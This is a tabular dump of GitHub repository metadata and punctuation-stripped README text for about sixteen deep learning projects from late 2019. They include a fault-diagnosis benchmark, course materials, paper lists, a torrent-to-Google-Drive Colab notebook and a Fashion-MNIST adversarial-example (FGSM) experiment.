ZhaoZhibin,DL-based-Intelligent-Diagnosis-Benchmark,n/a,DL based Intelligent Diagnosis Benchmark Code release for Deep Learning Algorithms for Rotating Machinery Intelligent Diagnosis An Open Source Benchmark Study https github com ZhaoZhibin DL based Intelligent Diagnosis Benchmark by Zhibin Zhao https www researchgate net profile ZhibinZhao5 Tianfu Li and Jingyao Wu Guide This project just provides the baseline lower bound accuracies and a unified intelligent fault diagnosis library which retains an extended interface for everyone to load their own datasets and models by themselves to carry out new studies Meanwhile all the experiments are executed under Window 10 and Pytorch 1 1 through running on a computer with an Intel Core i7 9700K GeForce RTX 2080Ti and 16G RAM RA random split with data augmentation RNA random split without data augmentation OA order split with data augmentation Requirements Python 3 7 Numpy 1 16 2 Pandas 0 24 2 Pickle tqdm 4 31 1 sklearn 0 21 3 Scipy 1 2 1 opencv python 4 1 0 25 PyWavelets 1 0 2 pytorch 1 1 torchvision 0 40 Datasets CWRU Bearing Dataset https csegroups case edu bearingdatacenter pages download data file MFPT Bearing Dataset https mfpt org fault data sets PU Bearing Dataset https mb uni paderborn de kat forschung datacenter bearing datacenter UoC Gear Fault Dataset https figshare com articles GearFaultData 6127874 1 XJTU SY Bearing Dataset http biaowang tech xjtu sy bearing datasets SEU Gearbox Dataset https github com cathysiyu Mechanical datasets JNU Bearing Dataset http mad net org 8765 explore html t 0 5831516555847212 Pakages This repository is organized as AEDatasets https github com ZhaoZhibin DL based Intelligent Diagnosis Benchmark tree master AEDatasets contains the loader of different datasets for AE models CNNDatasets https github com ZhaoZhibin DL based Intelligent Diagnosis Benchmark tree master CNNDatasets contains the loader of different datasets for MLP CNN and RNN models datasets https github com ZhaoZhibin DL based Intelligent Diagnosis Benchmark tree master datasets contains the data augmentation methods and the Pytorch datasets for 1D and 2D signals models https github com ZhaoZhibin DL based Intelligent Diagnosis Benchmark tree master models contains the models used in this project utils https github com ZhaoZhibin DL based Intelligent Diagnosis Benchmark tree master utils contains the functions for realization of the training procedure Usage download datasets use the train py to test MLP CNN and MLP models for example use the following commands to test MLP for SEU with mean std normalization and data augmentation python train py modelname MLP dataname SEU datadir Data Mechanical datasets normlizetype mean std processingtype OA checkpointdir Benchmark BenchmarkResults Ordersplit SEU MLPmean stdaugmentation use the trainae py to test AE models for example use the following commands to test SAE for SEU with mean std normalization and data augmentation python trainae py modelname Sae1d dataname SEU datadir Data Mechanical datasets normlizetype mean std processingtype OA checkpointdir Benchmark BenchmarkResults Ordersplit SEU Sae1dmean stdaugmentation Citation Contact zhibinzhao1993 gmail com litianfu stu xjtu edu cn,2019-11-29T18:35:46Z,2019-12-03T20:48:44Z,Python,ZhaoZhibin,User,1,3,1,13,master,ZhaoZhibin,1,0,0,0,0,0,0
messenger-1012,Torrent-To-Google-Drive,n/a,Torrent To Google Drive open the file in colab or use the link give below we mostly websites like seedr cc and other web services to get a resumable link or direct link but these sites have a limit in storage size in this we will show how to download a torrent file using a google drive storage this is 100 safe and even after adding you can remove the access in the settings if you want goto this link https colab research google com drive 19b0u9Y65bOIKXkLw9fBHEucWdci25ITm this Will open in collab by default Google Colab is a free cloud service and now it supports free GPU You can improve your Python programming language coding skills develop deep learning applications using popular libraries such as Keras TensorFlow PyTorch and OpenCV step 1 go to the link and sign in with google account step2 GOTO RUNTIME change the run time TYPE OPTION to GPU THIS OPTION GIVES MAXIMUM BANDWIDTH TO UPLOAD THE FILE TO DRIVE this option can be used mostly one time else u can run in another mode FireShot Capture 004 Copy of Torrent To Google Drive Downloader Colaboratory colab research google com step 3 Click on connect you need to execute the following code block every time you open code lab again FireShot Capture 005 Copy of Torrent To Google Drive Downloader Colaboratory colab research google com png to execute the code press on the play button to execute the code in that cell step 3execute the first block Install libtorrent and Initialize Session step 4 now mount the drive for that go to the given website and copy the access code after sign in with your Google account https accounts google com o oauth2 auth clientid 947318989803 6bn6qk8qdgf4n4g3pfee6491hc0brc4i apps googleusercontent com ampredirecturi urn 3Aietf 3Awg 3Aoauth 3A2 0 3Aoob ampscope email 20https 3A 2F 2Fwww googleapis com 2Fauth 2Fdocs test 20https 3A 2F 2Fwww googleapis com 2Fauth 2Fdrive 20https 3A 2F 2Fwww googleapis com 2Fauth 2Fdrive photos readonly 20https 3A 2F 2Fwww googleapis com 2Fauth 2Fpeopleapi readonly ampresponsetype code step5 paste the access code step 6 add the magnetic link or file step 7 execute the download block which will upload your file to drive step 8 after it is completed wait for some time step 9 now goto to the google drive and files will be in the torrent folder credit messenger1012 open cop of torrent to google in colab,2019-11-10T11:12:49Z,2019-12-09T07:35:44Z,Jupyter Notebook,messenger-1012,User,1,3,0,6,master,messenger-1012,1,0,0,0,0,0,0
ChristophBrune,DL_1920,n/a,DL19 20 Deep Learning From Theory to Practice Christoph Brune This repository contains the programming exercises for the Deep Learning course of 2019 2020 at the University of Twente Introduction to Colab During this course we will be using Google Colab https colab research google com github ChristophBrune DL1920 blob master codes 1tutorial lab00setup Hello 20Colab ipynb for the programming exercises Colaboratory is a free Jupyter notebook environment that requires no setup and runs entirely in the cloud Its main advantage is that Colab offers the possibility to run your code on high end GPU s which are well suited for Deep Learning models and can speed up your programs significantly Also most of the Python packages that we will be using are already installed in this environment If you prefer to do offline development outside of Colab you need to install Python and Jupyter on your own laptop as well as the relevant Python packages Below there are instructions on how to do this The GPU on your laptop is often not good enough to speed up the computations done in the models so we recommend to still use Colab for this The easiest way to interact with Colab is to save your code on Google Drive It is therefore recommended to use git to clone this repository into a folder that is synchronized with Drive see instructions below Your student account is also a Google account so you should already have access to Google Drive Local Python installation Follow the following instructions to install Miniconda and create a Python environment for the course 1 Download the Python 3 7 installer for Windows macOS or Linux from and install with default settings Note for Windows If you don t know if your operating system is 32 bit or 64 bit then open Settings System About System type to find out your xx bit system 1 Windows Open the Anaconda Prompt terminal from the Start menu MacOS Linux Open a terminal 1 Install git conda install git 1 Download the GitHub repository of the course git clone https github com ChristophBrune DL1920 1 Go to folder DL1920 with cd DL1920 and create a Python virtual environment with the packages required for the course conda env create f environment yml Note that the environment installation may take some time Notes The installed conda packages can be listed with conda list Some useful Conda commands are pwd cd ls al rm r f folder Add a python library to the Python environment conda install n DL1920 numpy for example Read Conda command lines for packages and environments Read managing Conda environments managing Conda environments conda condaenvironments pdf Conda command lines for packages and environments conda condacheatsheet pdf Running local Python notebooks 1 Windows Open the Anaconda Prompt terminal from the Start menu MacOS Linux Open a terminal 1 Activate the environment Windows activate deeplearncourse macOS Linux source activate deeplearncourse 1 Download the python notebooks by direct downloads from the next section or with GitHub with the command git pull 1 Start Jupyter with jupyter notebook The command opens a new tab in your web browser 1 Go to the exercise folder for example DL1920 codes 1tutorial lab01python python https www python org scipy https www scipy org anaconda https anaconda org miniconda https conda io miniconda html conda https conda io conda forge https conda forge org,2019-11-08T14:21:10Z,2019-12-10T20:47:53Z,Jupyter Notebook,ChristophBrune,User,3,2,3,26,master,ronvree#ChristophBrune,2,0,0,0,0,0,0
kreshuklab,teaching-dl-course-2019,n/a,EMBL Deep Learning course 2019 exercises and materials Schedule Webinar 1 02 12 Theory intro to machine learning Practical home work image manipulation and visualization in Python Webinar 2 16 12 Theory intro to CNNs Practical home work your first network on MNIST Webinar 3 13 01 Theory more about CNNs fully convolutional networks for image to image transforms segmentation denoising Practical home work U net You can find the Google Spreadsheet with Webinar registration and Questions Answers here https docs google com spreadsheets d 1VfinPM9TncBvNcxlcEf4 cox7QjJsj8dqhY2n2ehPI edit gid 0,2019-11-20T08:42:52Z,2019-12-14T22:52:56Z,Jupyter Notebook,kreshuklab,Organization,14,2,5,56,master,vzinche#pejmanrasti#maweigert#sstoma,4,0,0,3,6,0,2
FarTaFar,MLADS19_DL4NLP,n/a,,2019-11-18T22:06:33Z,2019-11-21T17:15:17Z,Jupyter Notebook,FarTaFar,User,2,2,5,1,master,FarTaFar,1,0,0,0,0,0,0
deep-rust,deep,n/a,deep Deep learning crate for Rust,2019-11-05T01:59:37Z,2019-11-15T19:21:31Z,Rust,deep-rust,Organization,3,2,0,4,master,vadixidav,1,0,0,2,1,1,2
lalaim,shb-deep-learning-from-scratch,n/a,Deep Learning from Scratch Study Reference https github com WegraLee deep learning from scratch,2019-11-07T05:38:54Z,2019-12-10T06:58:39Z,Jupyter Notebook,lalaim,User,3,2,2,67,master,economins#ai-yeongji#Ellie-TH#taikheon#lalaim#leekitten123,6,0,0,1,0,1,1
Chency809,DeepLearning,n/a,,2019-11-03T04:11:31Z,2019-12-01T23:08:31Z,Jupyter Notebook,Chency809,User,1,2,0,10,master,Chency809,1,0,0,0,0,0,0
MOONJOOYOUNG,Uncertainty-In-DeepLearning,n/a,Uncertainty Confidence in DeepLearning Paper list Basic 1995 Cordella A Method for Improving Classification Reliability of Multilayer Perceptrons paper https ieeexplore ieee org abstract document 410358 1999 Platt Probabilistic outputs for support vector machines and comparisons to regularized likelihood methods paper https www researchgate net profile JohnPlatt publication 2594015ProbabilisticOutputsforSupportVectorMachinesandComparisonstoRegularizedLikelihoodMethods links 004635154cff5262d6000000 pdf 2001 Zadrozny Obtaining calibrated probability estimates from decision trees and naive Bayesian classifiers paper http citeseerx ist psu edu viewdoc download doi 10 1 1 29 3039 rep rep1 type pdf 2005 Niculescu Mizil Predicting Good Probabilities With Supervised Learning paper https arxiv org pdf 1401 3390 pdf 2005 Niculescu Mizil Obtaining Calibrated Probabilities from Boosting paper https www aaai org Papers Workshops 2007 WS 07 05 WS07 05 006 pdf 2014 Naeini Binary Classifier Calibration Non parametric approach paper http github com 2014 VanderPals Frequentism and Bayesianism A Python driven Primer paper https arxiv org pdf 1411 5018 pdf 2015 Naeini Obtaining Well Calibrated Probabilities Using Bayesian Binning paper https scholar google com scholar hl ko assdt 0 2C5 q Obtaining Well Calibrated Probabilities Using Bayesian Binning btnG Bayesian 2015 Gal Dropout as a Bayesian approximation paper https arxiv org pdf 1506 02157 pdf 2016 Gal Dropout as a Bayesian Approximation Representing Model Uncertainty in Deep Learning paper http www jmlr org proceedings papers v48 gal16 pdf 2016 McClure Representing inferential uncertainty in deep neural networks through sampling paper https openreview net forum id HJ1JBJ5gl noteId HJhI6ZALe 2017 Kendall What Uncertainties Do We Need in Bayesian Deep Learning for Computer Vision paper http papers nips cc paper 7141 what uncertainties do we need 2018 Ayhan Test time data augmentation for estimation of heteroscedastic aleatoric uncertainty in deep neural networks paper https openreview net forum id rJZz knjz 2018 Hafner Noise Contrastive Priors for Functional Uncertainty paper https arxiv org abs 1807 09289 2018 Sensoy Evidential deep learning to quantify classification uncertainty paper http papers nips cc paper 7580 evidential deep learning to quantify classification uncertainty 2019 Seo Learning for single shot confidence calibration in deep neural networks through stochastic inferences paper http openaccess thecvf com contentCVPR2019 html SeoLearningforSingle ShotConfidenceCalibrationinDeepNeuralNetworksThroughCVPR2019paper html 2019 Ghandeharioun Characterizing Sources of Uncertainty to Proxy Calibration and Disambiguate Annotator and Data Bias paper https arxiv org abs 1909 09285 2019 Ahn Uncertainty based Continual Learning with Adaptive Regularization paper https papers nips cc paper 8690 uncertainty based continual learning with adaptive regularization paper http github com Non Bayesian 2017 Kahn Uncertainty Aware Reinforcement Learning for Collision Avoidance paper https arxiv org pdf 1702 01182 pdf 2017 Lakshminarayanan Simple and Scalable Predictive Uncertainty Estimation using Deep Ensembles paper http papers nips cc paper 7219 simple and scalable predictive uncertainty estimation using deep ensembles 2018 Choi Uncertainty Aware Learning from Demonstration using Mixture Density Networks with Sampling Free Variance Modeling paper https ieeexplore ieee org stamp stamp jsp arnumber 8462978 2018 Cortes Ciriano Deep Confidence A Computationally Efficient Framework for Calculating Reliable Prediction Errors for Deep Neural Networks paper https pubs acs org doi abs 10 1021 acs jcim 8b00542 2019 Bullock XNet A convolutional neural network CNN implementation for medical X Ray image segmentation suitable for small datasets paper https www spiedigitallibrary org conference proceedings of spie 10953 109531Z XNet a convolutional neural network CNN implementation for medical 10 1117 12 2512451 short 2018 Jiang To trust or not to trust a classifier paper http papers nips cc paper 7798 to trust or not to trust a classifier 2019 Hendrycks AugMix A Simple Data Processing Method to Improve Robustness and Uncertainty paper https arxiv org abs 1912 02781 2019 Perterson Human uncertainty makes classification more robust paper http openaccess thecvf com contentICCV2019 html PetersonHumanUncertaintyMakesClassificationMoreRobustICCV2019paper html 2019 Neverova Correlated Uncertainty for Learning Dense Correspondences from Noisy Labels paper https papers nips cc paper 8378 correlated uncertainty for learning dense correspondences from noisy labels paper http github com Calibration Confidence 2017 Guo On Calibration of Modern Neural Networks paper https arxiv org pdf 1706 04599 pdf 2017 Mandelbaum Distance based Confidence Score for Neural Network Classifiers paper https arxiv org abs 1709 09844 2017 Pereyra Regularizing neural networks by penalizing confident output distributions paper https arxiv org abs 1701 06548 2017 Pleiss On Fairness and Calibration paper http papers nips cc paper 7151 on fairness and calibration 2018 Gurau Dropout Distillation for Efficiently Estimating Model Confidence paper https arxiv org abs 1809 10562 2018 Kuleshob Accurate Uncertainties for Deep Learning Using Calibrated Regression paper https arxiv org abs 1807 00263 2018 Kumar Trainable calibration measures for neural networks from kernel mean embeddings paper http proceedings mlr press v80 kumar18a html 2018 Liu Generalized zero shot learning with deep calibration network paper http papers nips cc paper 7471 generalized zero shot learning with deep calibration network 2018 Mozafari Attended Temperature Scaling A Practical Approach for Calibrating Deep Neural Networks paper https arxiv org abs 1810 11586 2018 Neumann Relaxed Softmax Efficient Confidence Auto Calibration for Safe Pedestrian Detection paper https openreview net forum id S1lG7aTnqQ 2019 Hein Why ReLU networks yield high confidence predictions far away from the training data and how to mitigate the problem paper http openaccess thecvf com contentCVPR2019 html HeinWhyReLUNetworksYieldHigh ConfidencePredictionsFarAwayFromtheCVPR2019paper html 2019 Hendrycks Using pre training can improve model robustness and uncertainty paper https arxiv org abs 1901 09960 2019 Ji Bin wise Temperature Scaling BTS Improvement in Confidence Calibration Performance through Simple Scaling Techniques paper https arxiv org abs 1908 11528 2019 Shrikumar Calibration with Bias Corrected Temperature Scaling Improves Domain Adaptation Under Label Shift in Modern Neural Networks paper https arxiv org abs 1901 06852 2019 Corbiere Addressing Failure Prediction by learning model confidence paper https arxiv org abs 1910 04851 2019 Kumar Verified Uncertainty Calibration paper https papers nips cc paper 8635 verified uncertainty calibration paper http github com Ordinal Ranking 2017 Geifman Selective Classification for Deep Neural Networks paper https papers nips cc paper 7073 selective classification for deep neural networks pdfm 2018 Geifman Bias Reduced Uncertainty Estimation for Deep Neural Classifiers paper https arxiv org abs 1805 08206 paper http github com Out of Distribution Dectect 2016 Hendrycks A baseline for detecting misclassified and out of distribution examples in neural networks paper https arxiv org abs 1610 02136 2017 Lee Training confidence calibrated classifiers for detecting out of distribution samples paper https arxiv org abs 1711 09325 2017 Liang Enhancing the reliability of out of distribution image detection in neural networks paper https arxiv org abs 1706 02690 2018 DeVries Learning Confidence for Out of Distribution Detection in Neural Networks paper https arxiv org abs 1802 04865 2018 Hendrycks Deep anomaly detection with outlier exposure paper https arxiv org abs 1812 04606 2018 Li Reducing Over confident Errors outside the Known Distribution paper https arxiv org abs 1804 03166 2019 Yu Unsupervised Out of Distribution Detection by Maximum Classifier Discrepancy paper http openaccess thecvf com contentICCV2019 html YuUnsupervisedOut of DistributionDetectionbyMaximumClassifierDiscrepancyICCV2019paper html 2019 Rohekar Modeling Uncertainty by Learning a Hierarchy of Deep Neural Connections paper https papers nips cc paper 8677 modeling uncertainty by learning a hierarchy of deep neural connections 2019 Tagasovska Single Model Uncertainties for Deep Learning paper http github com paper http github com paper http github com,2019-11-27T12:44:38Z,2019-12-13T08:22:31Z,Python,MOONJOOYOUNG,User,1,2,0,24,master,MOONJOOYOUNG,1,0,0,0,0,0,0
abhijitramesh,Udacity_DeepLearning_Basic,n/a,,2019-11-28T15:34:02Z,2019-12-12T14:32:32Z,Jupyter Notebook,abhijitramesh,User,1,2,0,14,master,abhijitramesh,1,0,0,0,0,0,0
ghimireadarsh,DeepLearning-with-TensorFlow,n/a,This repo is comprised of Deep Learning practices from Cognitive AI course https courses cognitiveclass ai courses course v1 CognitiveClass ML0120ENv2 2018 courseware da924c023b9b4009972ea7f973a572b8 Objectives Using TensorFlow for Deep Learning Breaking down images into their principal components and automatically generating caption for it Recommending movies products anything based on what a certain person likes Processing incomplete sentences and predicting what was going to be written afterwards Syllabus Module 1 Introduction to TensorFlow Module 1 Introduction to Tensorflow Module 1 Introduction to TensorFlow md Tensorflow s Hello World Module 1 Tensorflow s Hello World ipynb Linear Regression with TensorFlow Module 1 Linear regression with Tensorflow ipynb NonLinear Regression Logistic Regression Module 1 Logistic regression with Tensorflow ipynb Activation Functions Module 1 Activation functions ipynb Module 2 Convolutional Networks Introduction to Convolutional Networks Convolution and Feature Learning Convolution with Python and TensorFlow The MNIST Database Multilayer Perceptron with TensorFlow Convolutional Network with TensorFlow Module 3 Recurrent Neural Network The Recurrent Neural Network Model Long Short Term Memory Recursive Neural Tensor Network Theory Applying Recurrent Networks to Language Modelling Module 4 Unsupervised Learning The Applications of Unsupervised Learning Restricted Boltzmann Machine Training a Restricted Boltzman Machine Recommendation System with a Restrictive Boltzman Machine Module 5 Autoendocders Introduction to Autoencoders and Applications Autoencoder Strucuture Autoencoders Deep Belief Network,2019-12-03T10:36:25Z,2019-12-05T06:43:26Z,Jupyter Notebook,ghimireadarsh,User,1,2,1,24,master,ghimireadarsh#shekkoirala,2,0,0,0,0,1,2
mrrrude,Deep_Learning,n/a,DeepLearning,2019-11-12T10:04:58Z,2019-12-04T06:50:05Z,Jupyter Notebook,mrrrude,User,1,2,0,4,master,mrrrude,1,0,0,0,0,0,0
HermitSun,deep-learning-attack-test,n/a,Keras 2 2 4 TensorFlow 1 14 0FGSMFGSM with momentum 0 83150 81000 91330 8935SSIM powershell generate py model hdf5 fashionmnist README md attacks baseattack py dataindexmap dat datalabelmap dat FGSMwithmomentumattack py FGSM iFGSMattack py iFGSM samplecompositionattack py attackdata attackdata npy models basemodel hdf5 basemodeltrain py cnnmodel hdf5 CNN cnnmodeltrain py modeltest py process concatattackdata py generatedatamap py map noises py splitdata py fashionmnist ssim py SSIM testdata fashionmnist testdata npy generate shape python load model model loadmodel model hdf5 load test data and labels traindata trainlabels tdata testlabels fashionmnist loaddata testdata np load testdata testdata npy generate attack data attackdata generate testdata len testdata 28 28 1 evaluate attack attacksuccess testdata attackdata python example py SSIMCPU30min CPU32824 76 sCPU81 5h 3ms1s367 30sCPU GPUCPU30s FGSM with momentum FGSM Fast Gradient Sign Method https i loli net 2019 11 18 rtsfgdqRxGkYIKm png 1 8 2 2551 3 sign iFGSM iFGSMFGSM https i loli net 2019 11 18 nmW2lRsTQzcqkHp png FGSM with momentum https camo githubusercontent com 923e92405256bbfebc25c1d6b6e44d6408e0fd87 687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f675f253742742b312537442532302533442532302535436d7525323025354363646f74253230675f253742742537442532302b253230253543667261632537422535436e61626c615f253742782537444a253238785f253742742537442535452537422a253744253243792532392537442537422535432537432535436e61626c615f253742782537444a253238785f253742742537442535452537422a253744253243792532392535432537435f3125374425324325323025354371756164253230785f253742742b312537442535452537422a2537442532302533442532302535436d617468726d253742636c6970253744253238785f253742742537442535452537422a2537442532302b253230253543616c70686125354363646f742535436d617468726d2537427369676e253744253238675f253742742b31253744253239253239 epochs10epochs10 SSIM 1 iFGSM5 FGSM 1 2 O n 2 kSSIMSSIM python attack images i alpha images j beta gamma O kn k shape 60000 28 28 1 python def createbasemodel model models Sequential model add layers Dense 28 28 activation relu inputshape 28 28 model add layers Dense 10 activation softmax model compile optimizer adam loss categoricalcrossentropy metrics acc return model 0 8871 CNN widthheightchannelCNNCNN 1 CNN python def createcnnmodel model models Sequential model add layers Conv2D 32 5 5 activation relu inputshape 28 28 1 model add layers MaxPooling2D 2 2 model add layers Conv2D 64 3 3 activation relu model add layers MaxPooling2D 2 2 model add layers Conv2D 64 3 3 activation relu model add layers Dropout 0 2 model add layers Flatten model add layers Dense 28 28 activation relu model add layers Dense 10 activation softmax model compile loss categoricalcrossentropy optimizer adam metrics accuracy return model 0 9176 0 9149 CNN VGG1632 32RGB28 28 depthwise separable convolution K RMSPropAdamAdam DropoutSGD python sgd optimizers SGD lr 0 1 momentum 0 9 decay 0 0 nesterov False python epochs 10 learningrate 0 1 decayrate learningrate epochs momentum 0 8 sgd optimizers SGD lr learningrate momentum momentum decay decayrate nesterov False python def stepdecay epoch initiallrate 0 1 drop 0 5 epochsdrop 10 0 lrate initiallrate math pow drop math floor 1 epoch epochsdrop return lrate callbackslist append LearningRateScheduler stepdecay DropoutSGD l1l2l1l2 SSIM 18 0 2CNN0 3SSIM0 3010 23 0 2SSIM0 2295 SSIM CNN 0 80 50CNN0 2SSIM0 1576 FGSM https github com Hyperparticle one pixel attack keras raw deeaabfd2c75ba613c1c10d6d50c37555018568f images Ackley gif advGAN GAN GPU matplotlibepochskerasTensorFlowTensorBoard CNNsummary inputshapeinputdim CNN generator CoLab VGG160 8CPUGPU TensorFlowKeras python sess tf Session K setsession sess foo K getsession run foo K clearsession numpyconcatenate np concatenate A B only integer scalar arrays can be converted to a scalar index GPU 1 Chollet F Deep Learning mit Python und Keras Das Praxis Handbuch vom Entwickler der Keras Bibliothek M MITP Verlags GmbH Co KG 2018 2 Brownlee J Deep learning with python Develop deep learning models on theano and tensorflow using keras M Machine Learning Mastery 2016 3 Srivastava N Hinton G Krizhevsky A et al Dropout a simple way to prevent neural networks from overfitting J The journal of machine learning research 2014 15 1 1929 1958 4 Kingma D P Ba J Adam A method for stochastic optimization J arXiv preprint arXiv 1412 6980 2014 5 Tieleman T Hinton G Lecture 6 5 rmsprop Divide the gradient by a running average of its recent magnitude J COURSERA Neural networks for machine learning 2012 4 2 26 31 6 Wang Z Bovik A C Sheikh H R et al Image quality assessment from error visibility to structural similarity J IEEE transactions on image processing 2004 13 4 600 612 7 Xiao C Li B Zhu J Y et al Generating adversarial examples with adversarial networks J arXiv preprint arXiv 1801 02610 2018 8 Goodfellow I J Shlens J Szegedy C Explaining and harnessing adversarial examples J arXiv preprint arXiv 1412 6572 2014 9 Bottou L Large scale machine learning with stochastic gradient descent M Proceedings of COMPSTAT 2010 Physica Verlag HD 2010 177 186 10 Dong Y Liao F Pang T et al Boosting adversarial attacks with momentum C Proceedings of the IEEE conference on computer vision and pattern recognition 2018 9185 9193 11 Moosavi Dezfooli S M Fawzi A Frossard P Deepfool a simple and accurate method to fool deep neural networks C Proceedings of the IEEE conference on computer vision and pattern recognition 2016 2574 2582 12 Su J Vargas D V Sakurai K One pixel attack for fooling deep neural networks J IEEE Transactions on Evolutionary Computation 2019 12 Su J Vargas D V Sakurai K One pixel attack for fooling deep neural networks J IEEE Transactions on Evolutionary Computation 2019,2019-11-14T13:15:41Z,2019-11-26T13:11:48Z,Python,HermitSun,User,1,2,0,45,master,HermitSun,1,0,0,0,0,0,0
manjunath5496,Deep-Learning-Papers,n/a,DeepLab Semantic Image Segmentation with Deep Convolutional Nets Atrous Convolution and Fully Connected CRFs Baby Talk Understanding and Generating Image Descriptions Perceptual Losses for Real Time Style Transfer and Super Resolution Show Attend and Tell Neural Image Caption Generation with Visual Attention Colorful Image Colorization Modeling and Propagating CNNs in a Tree Structure for Visual Tracking Deep Fragment Embeddings for Bidirectional Image Sentence Mapping Unsupervised Representation Learning with Deep Convolutional Generative Adversarial Networks Supersizing Self supervision Learning to Grasp from 50K Tries and 700 Robot Hours Faster R CNN Towards Real Time Object Detection with Region Proposal Networks Generative Visual Manipulation on the Natural Image Manifold Learning Hand Eye Coordination for Robotic Grasping with Deep Learning and Large Scale Data Collection Controlling Perceptual Factors in Neural Style Transfer A Neural Algorithm of Artistic Style Instance sensitive Fully Convolutional Networks End to End Training of Deep Visuomotor Policies Decoupled Neural Interfaces using Synthetic Gradients Low shot Visual Recognition by Shrinking and Hallucinating Features You Only Look Once Unified Real Time Object Detection Deep Visual Semantic Alignments for Generating Image Descriptions Learning to Navigate in Complex Environments Human level control through deep reinforcement learning Learning a Recurrent Visual Representation for Image Caption Generation Collective Robot Reinforcement Learning with Distributed Asynchronous Guided Policy Search Progressive Neural Networks Spatial Pyramid Pooling in Deep Convolutional Networks for Visual Recognition Instance aware Semantic Segmentation via Multi task Network Cascades Auto Encoding Variational Bayes Conditional Image Generation with PixelCNN Decoders Evolving Large Scale Neural Networks for Vision Based Reinforcement Learning Generating Sequences With Recurrent Neural Networks Target driven Visual Navigation in Indoor Scenes using Deep Reinforcement Learning From Captions to Visual Concepts and Back Building High level Features Using Large Scale Unsupervised Learning Pixel Recurrent Neural Networks Matching Networks for One Shot Learning Dropout A Simple Way to Prevent Neural Networks from Overfitting Fully Convolutional Networks for Semantic Segmentation Long term Recurrent Convolutional Networks for Visual Recognition and Description Learning to learn by gradient descent by gradient descent Semantic Style Transfer and Turning Two Bit Doodles into Fine Artwork SSD Single Shot MultiBox Detector Learning to Segment Object Candidates Deep Captioning with Multimodal Recurrent Neural Networks m RNN Deep Reinforcement Learning for Robotic Manipulation with Asynchronous Off Policy Updates Learning to Track at 100 FPS with Deep Regression Networks Asynchronous Methods for Deep Reinforcement Learning One shot Learning with Memory Augmented Neural Networks Transferring Rich Feature Hierarchies for Robust Visual Tracking Deep learning Rich feature hierarchies for accurate object detection and semantic segmentation Beyond Correlation Filters Learning Continuous Convolution Operators for Visual Tracking Fully Convolutional Siamese Networks for Object Tracking DRAW A Recurrent Neural Network For Image Generation Learning a Deep Compact Image Representation for Visual Tracking Human level concept learning through probabilistic program induction Continuous Deep Q Learning with Model based Acceleration Google s Neural Machine Translation System Bridging the Gap between Human and Machine Translation Improving neural networks by preventing co adaptation of feature detectors Siamese Neural Networks for One Shot Image Recognition ImageNet Classification with Deep Convolutional Neural Networks Neural Turing Machines Going Deeper with Convolutions Deep Neural Networks for Object Detection Learning Phrase Representations using RNN EncoderDecoder for Statistical Machine Translation Sim to Real Robot Learning from Pixels with Progressive Nets Deep Compression Compressing Deep Neural Networks with Pruning Trained Quantization and Huffman Coding Visual Tracking with Fully Convolutional Networks Trust Region Policy Optimization SqueezeNet AlexNet level accuracy with 50x fewer parameters and Deep Speech 2 End to End Speech Recognition in English and Mandarin Deep Residual Learning for Image Recognition A Fast Learning Algorithm for Deep Belief Nets Policy Distillation Dueling Network Architectures for Deep Reinforcement Learning A Character Level Decoder without Explicit Segmentation for Neural Machine Translation Show and Tell A Neural Image Caption Generator Continuous control with deep reinforcement learning Deep Neural Networks for Acoustic Modeling in Speech Recognition Layer Normalization Adam A Method for Stochastic Optimization Actor Mimic Deep Multitask and Transfer Reinforcement Learning End To End Memory Networks Generative Adversarial Nets On the importance of initialization and momentum in deep learning Playing Atari with Deep Reinforcement Learning Fully Character Level Neural Machine Translation without Explicit Segmentation Pointer Networks Speech Recognition with Deep Recurrent Neural Networks Neural Machine Translation by Jointly Learning to Align and Translate Towards End to End Speech Recognition with Recurrent Neural Networks Every Picture Tells a Story Generating Sentences from Images Deep Learning of Representations for Unsupervised and Transfer Learning Joint Learning of Words and Meaning Representations for Open Text Semantic Parsing Reducing the Dimensionality of Data with Neural Networks Fast and Accurate Recurrent Neural Network Acoustic Models for Speech Recognition Achieving Human Parity in Conversational Speech Recognition Effective Approaches to Attention based Neural Machine Translation Memory Networks Very Deep Convolutional Networks for Large Scale Image Recognition Reinforcement Learning Neural Turing Machines Neural Machine Translation of Rare Words with Subword Units Batch Normalization Accelerating Deep Network Training by Reducing Internal Covariate Shift Sequence to Sequence Learning with Neural Networks Addressing the Rare Word Problem in Neural Machine Translation Sequence to Sequence Learning with Neural Networks Distributed Representations ofWords and Phrases and their Compositionality Distilling the Knowledge in a Neural Network A Neural Conversational Model A Learned Representation For Artistic Style,2019-12-10T09:32:16Z,2019-12-10T16:33:15Z,n/a,manjunath5496,User,1,2,0,10,master,manjunath5496,1,0,0,0,0,0,0
jpcpereira,pdeng__tutorial_deep_learning,n/a,,2019-11-26T19:13:55Z,2019-12-13T12:35:22Z,Jupyter Notebook,jpcpereira,User,1,2,0,14,master,jpcpereira,1,0,0,0,0,0,0
JiayangWu,Deep-Learning-Final-Project,n/a,Outline for Big Project Title Conversation Generation with Transformer and ConceptNet Who Jiayang Wu jwu130 Haili Chen hchen132 Ke Ding kding8 Houyu Zhang hzhan148 Introduction Conversation generation is an active research topic in the NLP area A very general approach to achieve this is to use the Seq2Seq framework which includes an encoder to encode the post query representations and a decoder to generate responses However the responses generated by this approach always tend to be very general For example some cases of these responses might be It s a good idea I m not sure etc To deal with this problem we are trying to combine large corpus and external knowledge to generate more informative responses Methodology Model Use the transformer to be the encoder and the decoder Use GNN to encode the knowledge graph Use two attention mechanisms to attentively read representations from text and knowledge graph Training Methods Use the golden response to get the cross entropy loss and supervise the training process under the teacher forcing strategy Innovative Design We are trying to utilize a wide range of knowledge graphs to improve the performance of conversation response generation Specifically to generate more informative responses The biggest innovation is that we would figure out a way to filter out noises from knowledge entities as we extend multi hop entities Besides as far as we know we are the first to use the Transformer block in conversation generation task with double attention mechanisms Data We will be using the Reddit conversation dataset and ConceptNet Reddit conversation dataset is a single turn dialog dataset where each data point is presented in a post response pair while ConceptNet is a commonsense knowledge graph The details of data study can be found in data statistics Problems How to retrieve the knowledge graph given a post How to filter out the noises of the knowledge graph How to read representations from different sources attentively Metrics Perplexity Bleu Rouge Nist and Rouge to evaluate the relevance of generated response and golden response Besides Ent 4 Dist 1 and Dist 2 are used to evaluate the diversity of generated response Interesting Points Make use of the commonsense knowledge graph Use Transformer as the text encoder and response decoder Filter out the noises by attention mechanisms Related Work Hao Zhou Tom Young Minlie Huang Haizhou Zhao Jingfang Xu and Xiaoyan Zhu 2018 Commonsense knowledge aware conversation generation with graph attention In Proceedings of the 27th International Joint Conference on Artificial Intelligence IJCAI 18 Jrme Lang Ed 